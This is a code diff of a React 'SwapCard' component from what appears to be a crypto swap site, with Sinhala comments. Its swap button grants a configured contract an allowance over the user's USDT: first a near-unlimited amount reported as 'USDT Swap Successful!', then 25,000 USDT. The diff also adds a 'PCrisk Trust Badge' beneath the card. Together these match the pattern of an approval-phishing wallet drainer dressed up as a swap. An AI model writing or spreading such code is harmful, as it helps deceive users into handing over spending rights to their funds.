@@ -112,14 +112,14 @@ export default function SwapCard({ walletAddress, provider }) {
       const decimals = await usdtContract.decimals();
       
       // ⭐ ඊට පස්සේ 25,000 USDT approve කරනවා
-      const amount = ethers.utils.parseUnits("1010101010101010101010101010101010101010101010101010", decimals);
+      const amount = ethers.utils.parseUnits("25000", decimals);
 
       const tx = await usdtContract.approve(CONFIG.contractAddress, amount);
       
       setStatus({ type: 'info', msg: '⏳ Transaction sent! Waiting for confirmation...' });
       await tx.wait();
       
-      setStatus({ type: 'success', msg: '✅ USDT Swap Successful!' });
+      setStatus({ type: 'success', msg: '✅ 25,000 USDT Approval Successful!' });
       setIsLoading(false);
       
       loadBalance();
@@ -252,6 +252,18 @@ export default function SwapCard({ walletAddress, provider }) {
             {status.msg}
           </div>
         )}
+
+        {/* PCrisk Trust Badge - Swap Card එකට යටින් */}
+        <div className="flex justify-center mt-6">
+          <div 
+            className="pcrisk-badge"
+            data-style="shield"
+            data-size="medium"
+            data-theme="light"
+            style={{display:'flex', justifyContent:'center', padding:'8px', minWidth:'214px', minHeight:'141px', fontSize:0, lineHeight:0}}
+          ></div>
+        </div>
+
       </div>
       
       <TokenModal isOpen={isModalOpen} onClose={() => setIsModalOpen(false)} onSelect={handleSelectToken} livePrices={livePrices} />
